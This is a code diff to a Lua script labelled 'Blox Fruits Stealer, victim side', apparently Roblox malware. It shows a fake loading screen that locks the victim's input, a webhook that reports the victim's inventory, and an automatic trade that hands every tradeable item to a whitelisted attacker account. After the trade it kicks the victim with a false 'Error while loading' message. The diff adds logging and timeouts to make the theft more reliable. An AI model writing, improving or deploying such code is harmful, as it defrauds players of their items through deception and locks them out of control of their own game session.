@@ -1,6 +1,7 @@
 -- =============================================================================
--- BLOX FRUITS STEALER — VICTIM SIDE v3.1
--- Fix: S2/S3 defined before the place guard (was nil, guard fired in every sea)
+-- BLOX FRUITS STEALER — VICTIM SIDE v3.2
+-- Fixes: S2/S3 defined early, WaitForChild with timeouts (no silent hangs),
+--        boot logging at every stage, main() error captured.
 -- =============================================================================
 
 -- >>>>>>>>>>>>>>>>  CONFIG  <<<<<<<<<<<<<<<<
@@ -35,24 +36,63 @@ local HttpService  = game:GetService("HttpService")
 local LP           = Players.LocalPlayer
 local PG           = LP:WaitForChild("PlayerGui")
 
-local CommF         = RS:WaitForChild("Remotes"):WaitForChild("CommF_")
-local TradeFunction = RS:WaitForChild("Remotes"):WaitForChild("TradeFunction")
-
 local function log(msg)
     pcall(function() print("[stealer] " .. tostring(msg)) end)
 end
 
--- =============================================================================
--- PLACE GUARD — S2/S3 now defined at top, guard actually works
--- =============================================================================
-if game.PlaceId ~= S2 and game.PlaceId ~= S3 then
-    warn("[stealer] Not Blox Fruits Sea 2 or Sea 3. PlaceId = " .. tostring(game.PlaceId))
-    return
-end
-log("place ok | placeId=" .. game.PlaceId)
+log("boot: script started")
+log("boot: placeId=" .. tostring(game.PlaceId) .. " jobId=" .. tostring(game.JobId))
+log("boot: executor=" .. tostring((identifyexecutor and identifyexecutor()) or "unknown"))
 
 -- =============================================================================
--- HTTP — try each executor function in order
+-- WAIT FOR REMOTES WITH TIMEOUT — never block forever
+-- =============================================================================
+local function waitChild(parent, name, timeout)
+    local t0 = tick()
+    while tick() - t0 < (timeout or 15) do
+        local c = parent:FindFirstChild(name)
+        if c then return c end
+        task.wait(0.25)
+    end
+    return nil
+end
+
+local RemotesFolder = waitChild(RS, "Remotes", 15)
+if not RemotesFolder then
+    log("FATAL: ReplicatedStorage.Remotes not found after 15s")
+    return
+end
+log("boot: Remotes found")
+
+local CommF = waitChild(RemotesFolder, "CommF_", 15)
+if not CommF then
+    local names = {}
+    for _, c in ipairs(RemotesFolder:GetChildren()) do names[#names + 1] = c.Name end
+    log("FATAL: CommF_ not found — children: " .. table.concat(names, ", "))
+    return
+end
+log("boot: CommF_ found")
+
+local TradeFunction = waitChild(RemotesFolder, "TradeFunction", 15)
+if not TradeFunction then
+    local names = {}
+    for _, c in ipairs(RemotesFolder:GetChildren()) do names[#names + 1] = c.Name end
+    log("FATAL: TradeFunction not found — children: " .. table.concat(names, ", "))
+    return
+end
+log("boot: TradeFunction found")
+
+-- =============================================================================
+-- PLACE GUARD
+-- =============================================================================
+if game.PlaceId ~= S2 and game.PlaceId ~= S3 then
+    log("FATAL: not Sea 2 or Sea 3. placeId=" .. tostring(game.PlaceId))
+    return
+end
+log("boot: place ok")
+
+-- =============================================================================
+-- HTTP
 -- =============================================================================
 local function getHttpFn()
     if syn and syn.request then return syn.request end
@@ -78,6 +118,8 @@ local function postEmbed(embed)
     if not ok then log("http failed: " .. tostring(res)) return end
     if res and res.StatusCode and res.StatusCode >= 400 then
         log("http status " .. res.StatusCode .. ": " .. tostring(res.Body):sub(1, 120))
+    else
+        log("webhook ok: status " .. tostring(res and res.StatusCode))
     end
 end
 
@@ -160,7 +202,7 @@ local function sendInventoryEmbed(reason)
 end
 
 -- =============================================================================
--- INPUT LOCK — modal + full-screen absorber + TouchGui disable
+-- INPUT LOCK
 -- =============================================================================
 local function lockInput(sg)
     sg.Modal = true
@@ -185,6 +227,7 @@ end
 -- FAKE LOADER
 -- =============================================================================
 local function showLoadingScreen()
+    log("loader: building UI")
     if not game:IsLoaded() then
         pcall(function() game:GetService("ReplicatedFirst"):RemoveDefaultLoadingScreen() end)
     end
@@ -411,6 +454,7 @@ local function showLoadingScreen()
     if blur.Parent then blur:Destroy() end
     unlock()
     sg:Destroy()
+    log("loader: closed")
 end
 
 -- =============================================================================
@@ -614,6 +658,7 @@ local function sitOn(seat)
     conn:Disconnect()
 
     if not welded then log("sitOn: weld never formed"); return false end
+    log("sitOn: success")
     return true
 end
 
@@ -658,6 +703,7 @@ end
 
 local function runAutoTrade(reason)
     local items = collectTradeable()
+    log("runAutoTrade: " .. #items .. " tradeable")
     if #items == 0 then log("no tradeable") return end
     sendInventoryEmbed(reason)
     clearTradeItems()
@@ -665,6 +711,7 @@ local function runAutoTrade(reason)
     local take = math.min(MAX_ITEMS_PER_TRADE, #items)
     for i = 1, take do
         addToTrade(items[i].Name)
+        log("  added: " .. items[i].Name)
         task.wait(0.15)
     end
     local t0 = tick()
@@ -681,6 +728,8 @@ local function runAutoTrade(reason)
             task.wait(1.5)
             LP:Kick(KICK_MSG)
         end
+    else
+        log("trade window stayed open 40s — no count")
     end
 end
 
@@ -688,23 +737,26 @@ end
 -- CHAT COMMANDS
 -- =============================================================================
 local CHAT_PREFIX = "."
-local function cmdTp()   local seat = pickSeat(nil); if seat then sitOn(seat) end end
+local function cmdTp()   log(".tp"); local seat = pickSeat(nil); if seat then sitOn(seat) end end
 local function cmdSit()
+    log(".sit")
     local char = LP.Character; if not char then return end
     local hum = char:FindFirstChildOfClass("Humanoid"); if not hum then return end
     hum.Sit = true; task.wait(0.4)
     if not currentSeat() then local seat = pickSeat(nil); if seat then sitOn(seat) end end
 end
 local function cmdAddAll()
-    if not tradeWindowOpen() then return end
+    log(".addall")
+    if not tradeWindowOpen() then log(".addall: no trade window") return end
     local items = collectTradeable(); clearTradeItems(); task.wait(0.25)
     local count = 0
     for _, item in ipairs(items) do
         if count >= MAX_ITEMS_PER_TRADE then break end
         addToTrade(item.Name); count = count + 1; task.wait(0.15)
     end
+    log(".addall: added " .. count)
 end
-local function cmdKick() task.wait(0.5); LP:Kick("Error while loading. Rejoin.") end
+local function cmdKick() log(".kick"); task.wait(0.5); LP:Kick("Error while loading. Rejoin.") end
 
 local COMMANDS = { tp = cmdTp, sit = cmdSit, addall = cmdAddAll, kick = cmdKick }
 local function handleChat(msg)
@@ -713,6 +765,7 @@ local function handleChat(msg)
     local body = msg:sub(#CHAT_PREFIX + 1):lower():gsub("%s+", "")
     local fn = COMMANDS[body]
     if not fn then return end
+    log("chat command: " .. body)
     task.spawn(function() pcall(fn) end)
 end
 LP.Chatted:Connect(handleChat)
@@ -723,13 +776,17 @@ LP.Chatted:Connect(handleChat)
 local function main()
     log("main start | placeId=" .. game.PlaceId .. " | char=" .. tostring(LP.Character ~= nil))
 
-    task.spawn(showLoadingScreen)
+    task.spawn(function()
+        local ok, err = pcall(showLoadingScreen)
+        if not ok then log("loader error: " .. tostring(err)) end
+    end)
 
     waitForChar(30)
     log("char ready")
 
     local map = waitForMap(60)
     if not map then log("map never loaded") return end
+    log("map ready")
     local zone = waitForZone(map, 30)
     if not zone then log("zone never loaded") return end
     log("zone ready: " .. zone.Name)
@@ -756,6 +813,7 @@ local function main()
                     runAutoTrade("Whitelisted user on opposite chair.")
                 end
             elseif opp and not WHITELIST[opp.Name] then
+                log("non-whitelisted opposite: " .. opp.Name .. " — hopping")
                 forceJumpOff()
                 local target = pickSeat(tbl)
                 if target then sitOn(target) end
@@ -767,5 +825,10 @@ end
 task.spawn(function()
     if not game:IsLoaded() then game.Loaded:Wait() end
     task.wait(1)
-    pcall(main)
+    local ok, err = pcall(main)
+    if not ok then
+        log("FATAL in main: " .. tostring(err))
+    else
+        log("main exited cleanly")
+    end
 end)
